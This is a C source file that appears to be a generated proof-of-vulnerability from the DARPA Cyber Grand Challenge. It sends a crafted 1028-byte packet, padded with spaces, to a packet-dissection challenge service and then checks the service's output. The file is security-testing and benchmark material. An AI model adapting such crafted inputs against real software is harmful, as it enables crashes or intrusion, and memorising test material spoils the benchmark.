#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x61\x00\xff\xfe"
         "\x11\x63\x1f\x9d\x53\xe2\x5c\x17\x0a\x00\x00\x00\xf5\xf8\x8d\x23"
         "\x27\x64\x5f\xb6\xe9\x59\xcf\x17\x78\xcd\xa4\x67\x1b\x45\x7a\x8d"
         "\xa1\x4c\x86\x46\xfa\xe8\x3f\x03\x27\x57\xb5\xe8\xb2\xbd\xe1\xa9"
         "\x58\xa0\xd6\x25\xfb\x75\xc8\x3c\xf8\x0c\xfa\x48\x2d\x07\xc5\xef"
         "\x6c\x95\xf4\xf0\x38\x0c\x49\xd5\x31\xac\x54\x2a\x83\x18\x00\xec"
         "\x33\xa8\x38\x8e\x56\x48\x77\x57\xa2\x9b\x42\xfa\x6b\x61\x9e\xa5"
         "\x0a\x4c\xb8\x42\xb0\x59\x87\x59\x32\x81\x1a\x59\x21\xa1\x1a\x85"
         "\xa6\xb7\x3b\x8d\x9c\x17\xe8\x02\xd3\x22\x07\x75\xda\xaa\xe9\x48"
         "\xf3\x0b\x12\xb7\xf7\x0d\xaf\xf7\xf6\x2a\x6a\x95\xcb\xaf\x7a\xc2"
         "\x4d\x94\xa2\x8e\x2b\x31\x33\x64\xd7\xee\xe9\x91\x86\xa3\x4c\x55"
         "\x7c\x48\xd8\x36\x2d\x49\x03\xd1\x82\xa4\xa4\x75\xb9\x7a\xab\x1f"
         "\x3e\x1d\x0a\x2e\xc2\x43\xe4\x43\x4c\xd3\x23\xf5\xaa\x54\x22\x8f"
         "\x98\x18\xd9\x07\x91\x96\xd1\xd2\x02\x02\xe4\xc6\xd1\xf4\x09\xd1"
         "\x11\x59\xeb\xa7\x69\x1b\x03\x72\xab\xb1\x97\x28\x89\x48\x75\x8b"
         "\x45\xcf\xad\xf7\xb9\xeb\x1f\x90\x8a\xa3\xce\x65\x24\xa7\x3e\x5c"
         "\x78\x04\x8b\x76\x3d\x90\xf7\x18\x71\xa3\x93\xe2\x3d\xff\xdd\x1b"
         "\x26\xd3\x08\x4b\xc8\x19\x12\x77\x16\x74\xec\x4a\x86\x23\xfd\x0f"
         "\xb2\x55\x81\x1c\x9e\x00\x7f\xbe\x12\xa4\xc3\xeb\xe6\x6e\x56\x1b"
         "\xc8\x96\x7c\xe0\x19\x23\x4e\xa5\x1c\x9a\xab\x2a\x0c\xc5\x68\x05"
         "\x96\x01\xbe\x95\x6e\x96\x24\xc8\x10\x95\x88\x26\xbf\xee\xf4\xbb"
         "\xf3\x4f\x68\x8d\xde\xfe\x17\xd7\x81\x59\x08\x8b\x49\x25\xb4\x4d"
         "\x14\xe5\xf4\x58\x6b\x1b\xc1\x0b\xd6\x7b\xd3\xa5\xc5\xbf\xec\x58"
         "\x60\x18\x28\xfd\x52\x42\xdc\x60\xf4\xf6\x38\x51\x29\xe2\x22\x3c"
         "\x8e\x57\x3d\x3c\xe7\x65\x0d\x22\xb0\x0f\xdb\x76\xa3\xa5\x46\xd9"
         "\xa5\x2b\x9c\x0f\x22\x7e\x5a\x84\x9c\x64\x93\x70\x77\x0a\x8a\x22"
         "\xbc\x34\xd9\x45\x0f\x95\x4d\xe5\xa2\x56\x7f\x31\x35\xa5\xba\x0e"
         "\x9e\x92\x15\x6f\x56\xa3\x18\xdc\x69\x05\x1d\x85\x71\x5a\x2b\x17"
         "\x3e\xca\x4c\xb4\x4e\x94\xf9\xfd\x4d\x85\xb8\xf8\xf3\x5b\xab\x83"
         "\xba\xfa\x73\x12\xf9\xb7\x12\x14\x93\x92\xd2\xd2\x60\xcf\x79\xa9"
         "\xca\x8b\x48\xa0\x45\x1a\x67\x74\x2e\x95\xeb\x1d\x4c\x6e\xa4\xcd"
         "\x24\xf1\x61\x32\xf2\xd0\x86\x2e\xbd\x27\xdf\xd5\x4a\x19\xaa\x9b"
         "\x25\xe3\x5f\x73\x28\x00\xf0\x50\x18\xa0\xf5\x89\x2a\xbc\x21\x52"
         "\x6b\x3d\x4b\x61\xfa\x71\x42\xef\xcb\xc3\x0d\x31\x1a\x8f\x8c\x89"
         "\x19\x31\x9f\xe4\xb7\x3f\x29\x4d\xb7\x11\x14\x4d\x54\xcb\xdc\xbc"
         "\xc1\x04\x42\x18\x97\xfb\x79\x57\xac\x89\xe0\xee\xed\x9d\x90\xc9"
         "\x41\x25\x37\xbc\x11\x2e\x81\x7e\x24\xa4\xa3\xc1\x85\xc2\xbc\xed"
         "\x06\xe6\x8f\x46\x9c\xe3\xe3\xd2\x87\x94\xa3\x5b\xdc\xa5\xe3\x58"
         "\x7d\x20\x18\x18\x18\x99\x7b\x44\x4e\xed\x7d\x54\x2e\x24\xaf\x62"
         "\x85\x62\x1e\x24\x5a\xed\xd3\xef\xf3\x34\x26\x5c\x28\xf4\xc6\xd5"
         "\x42\x18\x00\xd4\xb8\x40\x5e\x18\x00\xae\x50\x89\xd2\xd1\xf5\xa7"
         "\x41\x0d\xe3\x60\x76\x5f\x08\x7d\xa9\xcb\xa8\x02\xec\x5e\x94\xf8"
         "\x03\x2b\x39\x2a\x39\x55\xf8\x1a\x5c\xc3\xae\xf6\xf8\x23\x45\x36"
         "\x21\x49\xd3\x60\x33\x38\x16\xdd\x44\xaf\x99\xc2\x98\x96\x50\xe5"
         "\xcd\x74\xcb\x96\x33\x01\x47\xe9\x5d\xec\xba\x4f\x9f\xdc\xe4\xba"
         "\x03\xd8\xc2\x71\xae\x88\x2e\xf4\xb5\x7d\x30\xf5\x71\x58\x26\x38"
         "\x25\xeb\x30\xe0\x2c\xaa\xf5\x04\x66\xb6\x58\x4f\x43\xc2\xcb\x8d"
         "\xdd\xd4\x0b\x5f\x3c\x6d\xa8\xf6\x44\x00\xa3\xe9\xf4\x5b\xb9\x5f"
         "\xe3\x67\xbc\xc1\x8e\x82\x42\x36\xec\x7a\x77\xf8\xa5\x2f\x63\x16"
         "\x69\x46\x85\x62\xa8\x80\xb8\xda\x69\x3c\x7a\xb4\x8b\x89\xb6\x12"
         "\xf9\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===interventraliaforeutter
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x69\x6e\x74\x65\x72\x76\x65\x6e\x74\x72\x61"
         "\x6c\x69\x61\x66\x6f\x72\x65\x75\x74\x74\x65\x72";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
